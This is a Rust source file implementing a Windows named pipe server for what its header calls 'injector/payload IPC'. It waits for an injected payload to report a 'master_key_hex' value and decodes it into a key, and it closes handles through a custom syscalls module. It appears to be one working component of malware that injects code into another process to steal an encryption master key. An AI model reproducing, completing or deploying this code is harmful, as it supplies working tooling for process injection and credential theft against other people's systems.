//! Named pipe server for injector/payload IPC.

use std::time::{Duration, Instant};

use serde_json::Value;
use windows::core::PCWSTR;
use windows::Win32::Foundation::{HANDLE, INVALID_HANDLE_VALUE};

use crate::syscalls;
use windows::Win32::Storage::FileSystem::{ReadFile, FILE_FLAGS_AND_ATTRIBUTES};
use windows::Win32::System::Pipes::{
    ConnectNamedPipe, CreateNamedPipeW, PIPE_READMODE_BYTE, PIPE_TYPE_BYTE, PIPE_WAIT,
};

const PIPE_ACCESS_INBOUND: u32 = 0x0000_0001;
const PIPE_UNLIMITED_INSTANCES: u32 = 255;

pub struct PipeServer {
    handle: HANDLE,
    buf: Vec<u8>,
}

impl PipeServer {
    pub unsafe fn create(name: &str) -> Result<Self, ()> {
        let wide = super::wide(name);
        let handle = CreateNamedPipeW(
            PCWSTR(wide.as_ptr()),
            FILE_FLAGS_AND_ATTRIBUTES(PIPE_ACCESS_INBOUND),
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES,
            4096,
            4096,
            0,
            None,
        );
        if handle == INVALID_HANDLE_VALUE {
            return Err(());
        }
        Ok(Self {
            handle,
            buf: Vec::with_capacity(4096),
        })
    }

    pub unsafe fn accept(&self) -> Result<(), ()> {
        match ConnectNamedPipe(self.handle, None) {
            Ok(()) => Ok(()),
            Err(e) if e.code().0 as u32 == 0x0000_0217 => Ok(()),
            Err(_) => Err(()),
        }
    }

    pub unsafe fn wait_for_key(&mut self, timeout: Duration) -> Result<Vec<u8>, String> {
        let deadline = Instant::now() + timeout;
        loop {
            if Instant::now() >= deadline {
                return Err("pipe timeout".into());
            }
            if let Some(line) = self.try_read_line()? {
                if let Some(key) = parse_line(&line) {
                    return Ok(key);
                }
                if let Some(err) = parse_error(&line) {
                    return Err(err);
                }
            }
            std::thread::sleep(Duration::from_millis(50));
        }
    }

    unsafe fn try_read_line(&mut self) -> Result<Option<String>, ()> {
        let mut chunk = [0u8; 512];
        let mut read = 0u32;
        match ReadFile(
            self.handle,
            Some(&mut chunk),
            Some(&mut read),
            None,
        ) {
            Ok(()) => {}
            Err(e) if e.code().0 as u32 == 0x0000_00E9 => return Ok(None),
            Err(_) => return Err(()),
        }
        if read == 0 {
            return Ok(None);
        }
        self.buf.extend_from_slice(&chunk[..read as usize]);
        if let Some(pos) = self.buf.iter().position(|&b| b == b'\n') {
            let line_bytes = self.buf.drain(..=pos).collect::<Vec<_>>();
            let line = String::from_utf8_lossy(&line_bytes[..line_bytes.len().saturating_sub(1)]).into_owned();
            return Ok(Some(line));
        }
        Ok(None)
    }
}

impl Drop for PipeServer {
    fn drop(&mut self) {
        unsafe {
            let _ = syscalls::close_handle(self.handle);
        }
    }
}

fn parse_line(line: &str) -> Option<Vec<u8>> {
    let v: Value = serde_json::from_str(line).ok()?;
    if v.get("type")?.as_str()? != "result" {
        return None;
    }
    let hex = v.get("master_key_hex")?.as_str()?;
    super::hex_to_key(hex)
}

fn parse_error(line: &str) -> Option<String> {
    let v: Value = serde_json::from_str(line).ok()?;
    if v.get("type")?.as_str()? != "error" {
        return None;
    }
    Some(v.get("msg")?.as_str()?.to_string())
}
